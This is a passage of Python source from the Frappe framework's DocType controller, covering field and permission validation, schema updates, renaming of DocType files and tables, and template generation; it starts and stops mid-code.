source.name\n\t\t\t\t\t\t\tand ifnull(target.`{fieldname}`, '')=\"\" '''.format(\n\t\t\t\t\t\t\t\tlink_doctype = link_df.options,\n\t\t\t\t\t\t\t\tsource_fieldname = source_fieldname,\n\t\t\t\t\t\t\t\tdoctype = self.name,\n\t\t\t\t\t\t\t\tfieldname = df.fieldname,\n\t\t\t\t\t\t\t\tlink_fieldname = link_fieldname\n\t\t\t\t\t))\n\n\tdef update_fields_to_fetch(self):\n\t\t'''Update fetch values based on queries setup'''\n\t\tif self.flags.update_fields_to_fetch_queries and not self.issingle:\n\t\t\tfor query in self.flags.update_fields_to_fetch_queries:\n\t\t\t\tfrappe.db.sql(query)\n\n\tdef validate_document_type(self):\n\t\tif self.document_type==\"Transaction\":\n\t\t\tself.document_type = \"Document\"\n\t\tif self.document_type==\"Master\":\n\t\t\tself.document_type = \"Setup\"\n\n\tdef validate_website(self):\n\t\t\"\"\"Ensure that website generator has field 'route'\"\"\"\n\t\tif self.has_web_view:\n\t\t\t# route field must be present\n\t\t\tif not 'route' in [d.fieldname for d in self.fields]:\n\t\t\t\tfrappe.throw(_('Field \"route\" is mandatory for Web Views'), title='Missing Field')\n\n\t\t\t# clear website cache\n\t\t\tfrappe.website.render.clear_cache()\n\n\tdef change_modified_of_parent(self):\n\t\t\"\"\"Change the timestamp of parent DocType if the current one is a child to clear caches.\"\"\"\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\t\tparent_list = frappe.db.sql(\"\"\"SELECT parent\n\t\t\tfrom tabDocField where fieldtype=\"Table\" and options=%s\"\"\", self.name)\n\t\tfor p in parent_list:\n\t\t\tfrappe.db.sql('UPDATE tabDocType SET modified=%s WHERE `name`=%s', (now(), p[0]))\n\n\tdef scrub_field_names(self):\n\t\t\"\"\"Sluggify fieldnames if not set from Label.\"\"\"\n\t\trestricted = ('name','parent','creation','modified','modified_by',\n\t\t\t'parentfield','parenttype','file_list', 'flags', 'docstatus')\n\t\tfor d in self.get(\"fields\"):\n\t\t\tif d.fieldtype:\n\t\t\t\tif (not getattr(d, \"fieldname\", None)):\n\t\t\t\t\tif d.label:\n\t\t\t\t\t\td.fieldname = d.label.strip().lower().replace(' ','_')\n\t\t\t\t\t\tif d.fieldname in restricted:\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '1'\n\t\t\t\t\t\tif d.fieldtype=='Section Break':\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '_section'\n\t\t\t\t\t\telif d.fieldtype=='Column Break':\n\t\t\t\t\t\t\td.fieldname = d.fieldname + '_column'\n\t\t\t\t\telse:\n\t\t\t\t\t\td.fieldname = d.fieldtype.lower().replace(\" \",\"_\") + \"_\" + str(d.idx)\n\n\t\t\t\td.fieldname = re.sub('''['\",./%@()<>{}]''', '', d.fieldname)\n\n\t\t\t\t# fieldnames should be lowercase\n\t\t\t\td.fieldname = d.fieldname.lower()\n\n\t\t\t# unique is automatically an index\n\t\t\tif d.unique: d.search_index = 0\n\n\tdef validate_series(self, autoname=None, name=None):\n\t\t\"\"\"Validate if `autoname` property is correctly set.\"\"\"\n\t\tif not autoname: autoname = self.autoname\n\t\tif not name: name = self.name\n\n\t\tif not autoname and self.get(\"fields\", {\"fieldname\":\"naming_series\"}):\n\t\t\tself.autoname = \"naming_series:\"\n\n\t\t# validate field name if autoname field:fieldname is used\n\t\t# Create unique index on autoname field automatically.\n\t\tif autoname and autoname.startswith('field:'):\n\t\t\tfield = autoname.split(\":\")[1]\n\t\t\tif not field or field not in [ df.fieldname for df in self.fields ]:\n\t\t\t\tfrappe.throw(_(\"Invalid fieldname '{0}' in autoname\".format(field)))\n\t\t\telse:\n\t\t\t\tfor df in self.fields:\n\t\t\t\t\tif df.fieldname == field:\n\t\t\t\t\t\tdf.unique = 1\n\t\t\t\t\t\tbreak\n\n\t\tif autoname and (not autoname.startswith('field:')) \\\n\t\t\tand (not autoname.startswith('eval:')) \\\n\t\t\tand (not autoname.lower() in ('prompt', 'hash')) \\\n\t\t\tand (not autoname.startswith('naming_series:')):\n\n\t\t\tprefix = autoname.split('.')[0]\n\t\t\tused_in = frappe.db.sql('select name from tabDocType where substring_index(autoname, \".\", 1) = %s and name!=%s', (prefix, name))\n\t\t\tif used_in:\n\t\t\t\tfrappe.throw(_(\"Series {0} already used in {1}\").format(prefix, used_in[0][0]))\n\n\tdef on_update(self):\n\t\t\"\"\"Update database schema, make controller templates if `custom` is not set and clear cache.\"\"\"\n\t\tfrom frappe.model.db_schema import updatedb\n\t\tself.delete_duplicate_custom_fields()\n\t\ttry:\n\t\t\tupdatedb(self.name, self)\n\t\texcept Exception as e:\n\t\t\tprint(\"\\n\\nThere was an issue while migrating the DocType: {}\\n\".format(self.name))\n\t\t\traise e\n\n\t\tself.change_modified_of_parent()\n\t\tmake_module_and_roles(self)\n\n\t\tself.update_fields_to_fetch()\n\n\t\tfrom frappe import conf\n\t\tif not self.custom and not (frappe.flags.in_import or frappe.flags.in_test) and conf.get('developer_mode'):\n\t\t\tself.export_doc()\n\t\t\tself.make_controller_template()\n\n\t\t\tif self.has_web_view:\n\t\t\t\tself.set_base_class_for_controller()\n\n\t\t# update index\n\t\tif not self.custom:\n\t\t\tself.run_module_method(\"on_doctype_update\")\n\t\t\tif self.flags.in_insert:\n\t\t\t\tself.run_module_method(\"after_doctype_insert\")\n\n\t\tdelete_notification_count_for(doctype=self.name)\n\t\tfrappe.clear_cache(doctype=self.name)\n\n\t\tif not frappe.flags.in_install and hasattr(self, 'before_update'):\n\t\t\tself.sync_global_search()\n\n\t\t# clear from local cache\n\t\tif self.name in frappe.local.meta_cache:\n\t\t\tdel frappe.local.meta_cache[self.name]\n\n\t\tclear_linked_doctype_cache()\n\n\tdef delete_duplicate_custom_fields(self):\n\t\tif not (frappe.db.table_exists(self.name) and frappe.db.table_exists(\"Custom Field\")):\n\t\t\treturn\n\t\tfields = [d.fieldname for d in self.fields if d.fieldtype in type_map]\n\t\tfrappe.db.sql('''delete from\n\t\t\t\t`tabCustom Field`\n\t\t\twhere\n\t\t\t\t dt = {0} and fieldname in ({1})\n\t\t'''.format('%s', ', '.join(['%s'] * len(fields))), tuple([self.name] + fields), as_dict=True)\n\n\tdef sync_global_search(self):\n\t\t'''If global search settings are changed, rebuild search properties for this table'''\n\t\tglobal_search_fields_before_update = [d.fieldname for d in\n\t\t\tself.before_update.fields if d.in_global_search]\n\t\tif self.before_update.show_name_in_global_search:\n\t\t\tglobal_search_fields_before_update.append('name')\n\n\t\tglobal_search_fields_after_update = [d.fieldname for d in\n\t\t\tself.fields if d.in_global_search]\n\t\tif self.show_name_in_global_search:\n\t\t\tglobal_search_fields_after_update.append('name')\n\n\t\tif set(global_search_fields_before_update) != set(global_search_fields_after_update):\n\t\t\tnow = (not frappe.request) or frappe.flags.in_test or frappe.flags.in_install\n\t\t\tfrappe.enqueue('frappe.utils.global_search.rebuild_for_doctype',\n\t\t\t\tnow=now, doctype=self.name)\n\n\tdef set_base_class_for_controller(self):\n\t\t'''Updates the controller class to subclass from `WebsiteGenertor`,\n\t\tif it is a subclass of `Document`'''\n\t\tcontroller_path = frappe.get_module_path(frappe.scrub(self.module),\n\t\t\t'doctype', frappe.scrub(self.name), frappe.scrub(self.name) + '.py')\n\n\t\twith open(controller_path, 'r') as f:\n\t\t\tcode = f.read()\n\n\t\tclass_string = '\\nclass {0}(Document)'.format(self.name.replace(' ', ''))\n\t\tif '\\nfrom frappe.model.document import Document' in code and class_string in code:\n\t\t\tcode = code.replace('from frappe.model.document import Document',\n\t\t\t\t'from frappe.website.website_generator import WebsiteGenerator')\n\t\t\tcode = code.replace('class {0}(Document)'.format(self.name.replace(' ', '')),\n\t\t\t\t'class {0}(WebsiteGenerator)'.format(self.name.replace(' ', '')))\n\n\t\twith open(controller_path, 'w') as f:\n\t\t\tf.write(code)\n\n\n\tdef run_module_method(self, method):\n\t\tfrom frappe.modules import load_doctype_module\n\t\tmodule = load_doctype_module(self.name, self.module)\n\t\tif hasattr(module, method):\n\t\t\tgetattr(module, method)()\n\n\tdef before_rename(self, old, new, merge=False):\n\t\t\"\"\"Throw exception if merge. DocTypes cannot be merged.\"\"\"\n\t\tif not self.custom and frappe.session.user != \"Administrator\":\n\t\t\tfrappe.throw(_(\"DocType can only be renamed by Administrator\"))\n\n\t\tself.check_developer_mode()\n\t\tself.validate_name(new)\n\n\t\tif merge:\n\t\t\tfrappe.throw(_(\"DocType can not be merged\"))\n\n\t\t# Do not rename and move files and folders for custom doctype\n\t\tif not self.custom and not frappe.flags.in_test and not frappe.flags.in_patch:\n\t\t\tself.rename_files_and_folders(old, new)\n\n\tdef after_rename(self, old, new, merge=False):\n\t\t\"\"\"Change table name using `RENAME TABLE` if table exists. Or update\n\t\t`doctype` property for Single type.\"\"\"\n\t\tif self.issingle:\n\t\t\tfrappe.db.sql(\"\"\"update tabSingles set doctype=%s where doctype=%s\"\"\", (new, old))\n\t\t\tfrappe.db.sql(\"\"\"update tabSingles set value=%s\n\t\t\t\twhere doctype=%s and field='name' and value = %s\"\"\", (new, new, old))\n\t\telse:\n\t\t\tfrappe.db.sql(\"rename table `tab%s` to `tab%s`\" % (old, new))\n\n\tdef rename_files_and_folders(self, old, new):\n\t\t# move files\n\t\tnew_path = get_doc_path(self.module, 'doctype', new)\n\t\tsubprocess.check_output(['mv', get_doc_path(self.module, 'doctype', old), new_path])\n\n\t\t# rename files\n\t\tfor fname in os.listdir(new_path):\n\t\t\tif frappe.scrub(old) in fname:\n\t\t\t\tsubprocess.check_output(['mv', os.path.join(new_path, fname),\n\t\t\t\t\tos.path.join(new_path, fname.replace(frappe.scrub(old), frappe.scrub(new)))])\n\n\t\tself.rename_inside_controller(new, old, new_path)\n\t\tfrappe.msgprint('Renamed files and replaced code in controllers, please check!')\n\n\tdef rename_inside_controller(self, new, old, new_path):\n\t\tfor fname in ('{}.js', '{}.py', '{}_list.js', '{}_calendar.js', 'test_{}.py', 'test_{}.js'):\n\t\t\tfname = os.path.join(new_path, fname.format(frappe.scrub(new)))\n\t\t\tif os.path.exists(fname):\n\t\t\t\twith open(fname, 'r') as f:\n\t\t\t\t\tcode = f.read()\n\t\t\t\twith open(fname, 'w') as f:\n\t\t\t\t\tf.write(code.replace(frappe.scrub(old).replace(' ', ''), frappe.scrub(new).replace(' ', '')))\n\n\tdef before_reload(self):\n\t\t\"\"\"Preserve naming series changes in Property Setter.\"\"\"\n\t\tif not (self.issingle and self.istable):\n\t\t\tself.preserve_naming_series_options_in_property_setter()\n\n\tdef preserve_naming_series_options_in_property_setter(self):\n\t\t\"\"\"Preserve naming_series as property setter if it does not exist\"\"\"\n\t\tnaming_series = self.get(\"fields\", {\"fieldname\": \"naming_series\"})\n\n\t\tif not naming_series:\n\t\t\treturn\n\n\t\t# check if atleast 1 record exists\n\t\tif not (frappe.db.table_exists(self.name) and frappe.db.sql(\"select name from `tab{}` limit 1\".format(self.name))):\n\t\t\treturn\n\n\t\texisting_property_setter = frappe.db.get_value(\"Property Setter\", {\"doc_type\": self.name,\n\t\t\t\"property\": \"options\", \"field_name\": \"naming_series\"})\n\n\t\tif not existing_property_setter:\n\t\t\tmake_property_setter(self.name, \"naming_series\", \"options\", naming_series[0].options, \"Text\", validate_fields_for_doctype=False)\n\t\t\tif naming_series[0].default:\n\t\t\t\tmake_property_setter(self.name, \"naming_series\", \"default\", naming_series[0].default, \"Text\", validate_fields_for_doctype=False)\n\n\tdef export_doc(self):\n\t\t\"\"\"Export to standard folder `[module]/doctype/[name]/[name].json`.\"\"\"\n\t\tfrom frappe.modules.export_file import export_to_files\n\t\texport_to_files(record_list=[['DocType', self.name]], create_init=True)\n\n\tdef import_doc(self):\n\t\t\"\"\"Import from standard folder `[module]/doctype/[name]/[name].json`.\"\"\"\n\t\tfrom frappe.modules.import_module import import_from_files\n\t\timport_from_files(record_list=[[self.module, 'doctype', self.name]])\n\n\tdef make_controller_template(self):\n\t\t\"\"\"Make boilerplate controller template.\"\"\"\n\t\tmake_boilerplate(\"controller._py\", self)\n\n\t\tif not self.istable:\n\t\t\tmake_boilerplate(\"test_controller._py\", self.as_dict())\n\t\t\tmake_boilerplate(\"controller.js\", self.as_dict())\n\t\t\t#make_boilerplate(\"controller_list.js\", self.as_dict())\n\t\t\tif not os.path.exists(frappe.get_module_path(frappe.scrub(self.module),\n\t\t\t\t'doctype', frappe.scrub(self.name), 'tests')):\n\t\t\t\tmake_boilerplate(\"test_controller.js\", self.as_dict())\n\n\t\tif self.has_web_view:\n\t\t\ttemplates_path = frappe.get_module_path(frappe.scrub(self.module), 'doctype', frappe.scrub(self.name), 'templates')\n\t\t\tif not os.path.exists(templates_path):\n\t\t\t\tos.makedirs(templates_path)\n\t\t\tmake_boilerplate('templates/controller.html', self.as_dict())\n\t\t\tmake_boilerplate('templates/controller_row.html', self.as_dict())\n\n\tdef make_amendable(self):\n\t\t\"\"\"If is_submittable is set, add amended_from docfields.\"\"\"\n\t\tif self.is_submittable:\n\t\t\tif not frappe.db.sql(\"\"\"select name from tabDocField\n\t\t\t\twhere fieldname = 'amended_from' and parent = %s\"\"\", self.name):\n\t\t\t\t\tself.append(\"fields\", {\n\t\t\t\t\t\t\"label\": \"Amended From\",\n\t\t\t\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\t\t\t\"fieldname\": \"amended_from\",\n\t\t\t\t\t\t\"options\": self.name,\n\t\t\t\t\t\t\"read_only\": 1,\n\t\t\t\t\t\t\"print_hide\": 1,\n\t\t\t\t\t\t\"no_copy\": 1\n\t\t\t\t\t})\n\n\tdef get_max_idx(self):\n\t\t\"\"\"Returns the highest `idx`\"\"\"\n\t\tmax_idx = frappe.db.sql(\"\"\"select max(idx) from `tabDocField` where parent = %s\"\"\",\n\t\t\tself.name)\n\t\treturn max_idx and max_idx[0][0] or 0\n\n\tdef validate_name(self, name=None):\n\t\tif not name:\n\t\t\tname = self.name\n\n\t\t# a DocType's name should not start with a number or underscore\n\t\t# and should only contain letters, numbers and underscore\n\t\tif six.PY2:\n\t\t\tis_a_valid_name = re.match(\"^(?![\\W])[^\\d_\\s][\\w ]+$\", name)\n\t\telse:\n\t\t\tis_a_valid_name = re.match(\"^(?![\\W])[^\\d_\\s][\\w ]+$\", name, flags = re.ASCII)\n\t\tif not is_a_valid_name:\n\t\t\tfrappe.throw(_(\"DocType's name should start with a letter and it can only consist of letters, numbers, spaces and underscores\"), frappe.NameError)\n\ndef validate_fields_for_doctype(doctype):\n\tdoc = frappe.get_doc(\"DocType\", doctype)\n\tdoc.delete_duplicate_custom_fields()\n\tvalidate_fields(frappe.get_meta(doctype, cached=False))\n\n# this is separate because it is also called via custom field\ndef validate_fields(meta):\n\t\"\"\"Validate doctype fields. Checks\n\t1. There are no illegal characters in fieldnames\n\t2. If fieldnames are unique.\n\t3. Validate column length.\n\t4. Fields that do have database columns are not mandatory.\n\t5. `Link` and `Table` options are valid.\n\t6. **Hidden** and **Mandatory** are not set simultaneously.\n\t7. `Check` type field has default as 0 or 1.\n\t8. `Dynamic Links` are correctly defined.\n\t9. Precision is set in numeric fields and is between 1 & 6.\n\t10. Fold is not at the end (if set).\n\t11. `search_fields` are valid.\n\t12. `title_field` and title field pattern are valid.\n\t13. `unique` check is only valid for Data, Link and Read Only fieldtypes.\n\t14. `unique` cannot be checked if there exist non-unique values.\n\n\t:param meta: `frappe.model.meta.Meta` object to check.\"\"\"\n\tdef check_illegal_characters(fieldname):\n\t\tvalidate_column_name(fieldname)\n\n\tdef check_unique_fieldname(docname, fieldname):\n\t\tduplicates = list(filter(None, map(lambda df: df.fieldname==fieldname and str(df.idx) or None, fields)))\n\t\tif len(duplicates) > 1:\n\t\t\tfrappe.throw(_(\"{0}: Fieldname {1} appears multiple times in rows {2}\").format(docname, fieldname, \", \".join(duplicates)), UniqueFieldnameError)\n\n\tdef check_fieldname_length(fieldname):\n\t\tvalidate_column_length(fieldname)\n\n\tdef check_illegal_mandatory(docname, d):\n\t\tif (d.fieldtype in no_value_fields) and d.fieldtype!=\"Table\" and d.reqd:\n\t\t\tfrappe.throw(_(\"{0}: Field {1} of type {2} cannot be mandatory\").format(docname, d.label, d.fieldtype), IllegalMandatoryError)\n\n\tdef check_link_table_options(docname, d):\n\t\tif d.fieldtype in (\"Link\", \"Table\"):\n\t\t\tif not d.options:\n\t\t\t\tfrappe.throw(_(\"{0}: Options required for Link or Table type field {1} in row {2}\").format(docname, d.label, d.idx), DoctypeLinkError)\n\t\t\tif d.options==\"[Select]\" or d.options==d.parent:\n\t\t\t\treturn\n\t\t\tif d.options != d.parent:\n\t\t\t\toptions = frappe.db.get_value(\"DocType\", d.options, \"name\")\n\t\t\t\tif not options:\n\t\t\t\t\tfrappe.throw(_(\"{0}: Options must be a valid DocType for field {1} in row {2}\").format(docname, d.label, d.idx), WrongOptionsDoctypeLinkError)\n\t\t\t\telif not (options == d.options):\n\t\t\t\t\tfrappe.throw(_(\"{0}: Options {1} must be the same as doctype name {2} for the field {3}\", DoctypeLinkError)\n\t\t\t\t\t\t.format(docname, d.options, options, d.label))\n\t\t\t\telse:\n\t\t\t\t\t# fix case\n\t\t\t\t\td.options = options\n\n\tdef check_hidden_and_mandatory(docname, d):\n\t\tif d.hidden and d.reqd and not d.default:\n\t\t\tfrappe.throw(_(\"{0}: Field {1} in row {2} cannot be hidden and mandatory without default\").format(docname, d.label, d.idx), HiddenAndMandatoryWithoutDefaultError)\n\n\tdef check_width(d):\n\t\tif d.fieldtype == \"Currency\" and cint(d.width) < 100:\n\t\t\tfrappe.throw(_(\"Max width for type Currency is 100px in row {0}\").format(d.idx))\n\n\tdef check_in_list_view(d):\n\t\tif d.in_list_view and (d.fieldtype in not_allowed_in_list_view):\n\t\t\tfrappe.throw(_(\"'In List View' not allowed for type {0} in row {1}\").format(d.fieldtype, d.idx))\n\n\tdef check_in_global_search(d):\n\t\tif d.in_global_search and d.fieldtype in no_value_fields:\n\t\t\tfrappe.throw(_(\"'In Global Search' not allowed for type {0} in row {1}\")\n\t\t\t\t.format(d.fieldtype, d.idx))\n\n\tdef check_dynamic_link_options(d):\n\t\tif d.fieldtype==\"Dynamic Link\":\n\t\t\tdoctype_pointer = list(filter(lambda df: df.fieldname==d.options, fields))\n\t\t\tif not doctype_pointer or (doctype_pointer[0].fieldtype not in (\"Link\", \"Select\")) \\\n\t\t\t\tor (doctype_pointer[0].fieldtype==\"Link\" and doctype_pointer[0].options!=\"DocType\"):\n\t\t\t\tfrappe.throw(_(\"Options 'Dynamic Link' type of field must point to another Link Field with options as 'DocType'\"))\n\n\tdef check_illegal_default(d):\n\t\tif d.fieldtype == \"Check\" and d.default and d.default not in ('0', '1'):\n\t\t\tfrappe.throw(_(\"Default for 'Check' type of field must be either '0' or '1'\"))\n\t\tif d.fieldtype == \"Select\" and d.default and (d.default not in d.options.split(\"\\n\")):\n\t\t\tfrappe.throw(_(\"Default for {0} must be an option\").format(d.fieldname))\n\n\tdef check_precision(d):\n\t\tif d.fieldtype in (\"Currency\", \"Float\", \"Percent\") and d.precision is not None and not (1 <= cint(d.precision) <= 6):\n\t\t\tfrappe.throw(_(\"Precision should be between 1 and 6\"))\n\n\tdef check_unique_and_text(docname, d):\n\t\tif meta.issingle:\n\t\t\td.unique = 0\n\t\t\td.search_index = 0\n\n\t\tif getattr(d, \"unique\", False):\n\t\t\tif d.fieldtype not in (\"Data\", \"Link\", \"Read Only\"):\n\t\t\t\tfrappe.throw(_(\"{0}: Fieldtype {1} for {2} cannot be unique\").format(docname, d.fieldtype, d.label), NonUniqueError)\n\n\t\t\tif not d.get(\"__islocal\"):\n\t\t\t\ttry:\n\t\t\t\t\thas_non_unique_values = frappe.db.sql(\"\"\"select `{fieldname}`, count(*)\n\t\t\t\t\t\tfrom `tab{doctype}` where ifnull({fieldname}, '') != ''\n\t\t\t\t\t\tgroup by `{fieldname}` having count(*) > 1 limit 1\"\"\".format(\n\t\t\t\t\t\tdoctype=d.parent, fieldname=d.fieldname))\n\n\t\t\t\texcept pymysql.InternalError as e:\n\t\t\t\t\tif e.args and e.args[0] == ER.BAD_FIELD_ERROR:\n\t\t\t\t\t\t# ignore if missing column, else raise\n\t\t\t\t\t\t# this happens in case of Custom Field\n\t\t\t\t\t\tpass\n\t\t\t\t\telse:\n\t\t\t\t\t\traise\n\n\t\t\t\telse:\n\t\t\t\t\t# else of try block\n\t\t\t\t\tif has_non_unique_values and has_non_unique_values[0][0]:\n\t\t\t\t\t\tfrappe.throw(_(\"{0}: Field '{1}' cannot be set as Unique as it has non-unique values\").format(docname, d.label), NonUniqueError)\n\n\t\tif d.search_index and d.fieldtype in (\"Text\", \"Long Text\", \"Small Text\", \"Code\", \"Text Editor\"):\n\t\t\tfrappe.throw(_(\"{0}:Fieldtype {1} for {2} cannot be indexed\").format(docname, d.fieldtype, d.label), CannotIndexedError)\n\n\tdef check_fold(fields):\n\t\tfold_exists = False\n\t\tfor i, f in enumerate(fields):\n\t\t\tif f.fieldtype==\"Fold\":\n\t\t\t\tif fold_exists:\n\t\t\t\t\tfrappe.throw(_(\"There can be only one Fold in a form\"))\n\t\t\t\tfold_exists = True\n\t\t\t\tif i < len(fields)-1:\n\t\t\t\t\tnxt = fields[i+1]\n\t\t\t\t\tif nxt.fieldtype != \"Section Break\":\n\t\t\t\t\t\tfrappe.throw(_(\"Fold must come before a Section Break\"))\n\t\t\t\telse:\n\t\t\t\t\tfrappe.throw(_(\"Fold can not be at the end of the form\"))\n\n\tdef check_search_fields(meta, fields):\n\t\t\"\"\"Throw exception if `search_fields` don't contain valid fields.\"\"\"\n\t\tif not meta.search_fields:\n\t\t\treturn\n\n\t\t# No value fields should not be included in search field\n\t\tsearch_fields = [field.strip() for field in (meta.search_fields or \"\").split(\",\")]\n\t\tfieldtype_mapper = { field.fieldname: field.fieldtype \\\n\t\t\tfor field in filter(lambda field: field.fieldname in search_fields, fields) }\n\n\t\tfor fieldname in search_fields:\n\t\t\tfieldname = fieldname.strip()\n\t\t\tif (fieldtype_mapper.get(fieldname) in no_value_fields) or \\\n\t\t\t\t(fieldname not in fieldname_list):\n\t\t\t\tfrappe.throw(_(\"Search field {0} is not valid\").format(fieldname))\n\n\tdef check_title_field(meta):\n\t\t\"\"\"Throw exception if `title_field` isn't a valid fieldname.\"\"\"\n\t\tif not meta.get(\"title_field\"):\n\t\t\treturn\n\n\t\tif meta.title_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Title field must be a valid fieldname\"), InvalidFieldNameError)\n\n\t\tdef _validate_title_field_pattern(pattern):\n\t\t\tif not pattern:\n\t\t\t\treturn\n\n\t\t\tfor fieldname in re.findall(\"{(.*?)}\", pattern, re.UNICODE):\n\t\t\t\tif fieldname.startswith(\"{\"):\n\t\t\t\t\t# edge case when double curlies are used for escape\n\t\t\t\t\tcontinue\n\n\t\t\t\tif fieldname not in fieldname_list:\n\t\t\t\t\tfrappe.throw(_(\"{{{0}}} is not a valid fieldname pattern. It should be {{field_name}}.\").format(fieldname),\n\t\t\t\t\t\tInvalidFieldNameError)\n\n\t\tdf = meta.get(\"fields\", filters={\"fieldname\": meta.title_field})[0]\n\t\tif df:\n\t\t\t_validate_title_field_pattern(df.options)\n\t\t\t_validate_title_field_pattern(df.default)\n\n\tdef check_image_field(meta):\n\t\t'''check image_field exists and is of type \"Attach Image\"'''\n\t\tif not meta.image_field:\n\t\t\treturn\n\n\t\tdf = meta.get(\"fields\", {\"fieldname\": meta.image_field})\n\t\tif not df:\n\t\t\tfrappe.throw(_(\"Image field must be a valid fieldname\"), InvalidFieldNameError)\n\t\tif df[0].fieldtype != 'Attach Image':\n\t\t\tfrappe.throw(_(\"Image field must be of type Attach Image\"), InvalidFieldNameError)\n\n\tdef check_is_published_field(meta):\n\t\tif not meta.is_published_field:\n\t\t\treturn\n\n\t\tif meta.is_published_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Is Published Field must be a valid fieldname\"), InvalidFieldNameError)\n\n\tdef check_timeline_field(meta):\n\t\tif not meta.timeline_field:\n\t\t\treturn\n\n\t\tif meta.timeline_field not in fieldname_list:\n\t\t\tfrappe.throw(_(\"Timeline field must be a valid fieldname\"), InvalidFieldNameError)\n\n\t\tdf = meta.get(\"fields\", {\"fieldname\": meta.timeline_field})[0]\n\t\tif df.fieldtype not in (\"Link\", \"Dynamic Link\"):\n\t\t\tfrappe.throw(_(\"Timeline field must be a Link or Dynamic Link\"), InvalidFieldNameError)\n\n\tdef check_sort_field(meta):\n\t\t'''Validate that sort_field(s) is a valid field'''\n\t\tif meta.sort_field:\n\t\t\tsort_fields = [meta.sort_field]\n\t\t\tif ','  in meta.sort_field:\n\t\t\t\tsort_fields = [d.split()[0] for d in meta.sort_field.split(',')]\n\n\t\t\tfor fieldname in sort_fields:\n\t\t\t\tif not fieldname in fieldname_list + list(default_fields):\n\t\t\t\t\tfrappe.throw(_(\"Sort field {0} must be a valid fieldname\").format(fieldname),\n\t\t\t\t\t\tInvalidFieldNameError)\n\n\tdef check_illegal_depends_on_conditions(docfield):\n\t\t''' assignment operation should not be allowed in the depends on condition.'''\n\t\tdepends_on_fields = [\"depends_on\", \"collapsible_depends_on\"]\n\t\tfor field in depends_on_fields:\n\t\t\tdepends_on = docfield.get(field, None)\n\t\t\tif depends_on and (\"=\" in depends_on) and \\\n\t\t\t\tre.match(\"\"\"[\\w\\.:_]+\\s*={1}\\s*[\\w\\.@'\"]+\"\"\", depends_on):\n\t\t\t\tfrappe.throw(_(\"Invalid {0} condition\").format(frappe.unscrub(field)), frappe.ValidationError)\n\n\tdef scrub_options_in_select(field):\n\t\t\"\"\"Strip options for whitespaces\"\"\"\n\n\t\tif field.fieldtype == \"Select\" and field.options is not None:\n\t\t\toptions_list = []\n\t\t\tfor i, option in enumerate(field.options.split(\"\\n\")):\n\t\t\t\t_option = option.strip()\n\t\t\t\tif i==0 or _option:\n\t\t\t\t\toptions_list.append(_option)\n\t\t\tfield.options = '\\n'.join(options_list)\n\n\tdef scrub_fetch_from(field):\n\t\tif hasattr(field, 'fetch_from') and getattr(field, 'fetch_from'):\n\t\t\tfield.fetch_from = field.fetch_from.strip('\\n').strip()\n\n\tfields = meta.get(\"fields\")\n\tfieldname_list = [d.fieldname for d in fields]\n\n\tnot_allowed_in_list_view = list(copy.copy(no_value_fields))\n\tnot_allowed_in_list_view.append(\"Attach Image\")\n\tif meta.istable:\n\t\tnot_allowed_in_list_view.remove('Button')\n\n\tfor d in fields:\n\t\tif not d.permlevel: d.permlevel = 0\n\t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n\t\tif not d.fieldname:\n\t\t\td.fieldname = d.fieldname.lower()\n\n\t\tcheck_illegal_characters(d.fieldname)\n\t\tcheck_unique_fieldname(meta.get(\"name\"), d.fieldname)\n\t\tcheck_fieldname_length(d.fieldname)\n\t\tcheck_illegal_mandatory(meta.get(\"name\"), d)\n\t\tcheck_link_table_options(meta.get(\"name\"), d)\n\t\tcheck_dynamic_link_options(d)\n\t\tcheck_hidden_and_mandatory(meta.get(\"name\"), d)\n\t\tcheck_in_list_view(d)\n\t\tcheck_in_global_search(d)\n\t\tcheck_illegal_default(d)\n\t\tcheck_unique_and_text(meta.get(\"name\"), d)\n\t\tcheck_illegal_depends_on_conditions(d)\n\t\tscrub_options_in_select(d)\n\t\tscrub_fetch_from(d)\n\n\tcheck_fold(fields)\n\tcheck_search_fields(meta, fields)\n\tcheck_title_field(meta)\n\tcheck_timeline_field(meta)\n\tcheck_is_published_field(meta)\n\tcheck_sort_field(meta)\n\tcheck_image_field(meta)\n\ndef validate_permissions_for_doctype(doctype, for_remove=False):\n\t\"\"\"Validates if permissions are set correctly.\"\"\"\n\tdoctype = frappe.get_doc(\"DocType\", doctype)\n\tvalidate_permissions(doctype, for_remove)\n\n\t# save permissions\n\tfor perm in doctype.get(\"permissions\"):\n\t\tperm.db_update()\n\n\tclear_permissions_cache(doctype.name)\n\ndef clear_permissions_cache(doctype):\n\tfrappe.clear_cache(doctype=doctype)\n\tdelete_notification_count_for(doctype)\n\tfor user in frappe.db.sql_list(\"\"\"select\n\t\t\tdistinct `tabHas Role`.parent\n\t\tfrom\n\t\t\t`tabHas Role`,\n\t\ttabDocPerm\n\t\t\twhere tabDocPerm.parent = %s\n\t\t\tand tabDocPerm.role = `tabHas Role`.role\"\"\", doctype):\n\t\tfrappe.clear_cache(user=user)\n\ndef validate_permissions(doctype, for_remove=False):\n\tpermissions = doctype.get(\"permissions\")\n\tif not permissions:\n\t\tfrappe.msgprint(_('No Permissions Specified'), alert=True, indicator='orange')\n\tissingle = issubmittable = isimportable = False\n\tif doctype:\n\t\tissingle = cint(doctype.issingle)\n\t\tissubmittable = cint(doctype.is_submittable)\n\t\tisimportable = cint(doctype.allow_import)\n\n\tdef get_txt(d):\n\t\treturn _(\"For {0} at level {1} in {2} in row {3}\").format(d.role, d.permlevel, d.parent, d.idx)\n\n\tdef check_atleast_one_set(d):\n\t\tif not d.read and not d.write and not d.submit and not d.cancel and not d.create:\n\t\t\tfrappe.throw(_(\"{0}: No basic permissions set\").format(get_txt(d)))\n\n\tdef check_double(d):\n\t\thas_similar = False\n\t\tsimilar_because_of = \"\"\n\t\tfor p in permissions:\n\t\t\tif p.role==d.role and p.permlevel==d.permlevel and p!=d:\n\t\t\t\tif p.if_owner==d.if_owner:\n\t\t\t\t\tsimilar_because_of = _(\"If Owner\")\n\t\t\t\t\thas_similar = True\n\t\t\t\t\tbreak\n\n\t\tif has_similar:\n\t\t\tfrappe.throw(_(\"{0}: Only one rule allowed with the same Role, Level and {1}\")\\\n\t\t\t\t.format(get_txt(d),\tsimilar_because_of))\n\n\tdef check_level_zero_is_set(d):\n\t\tif 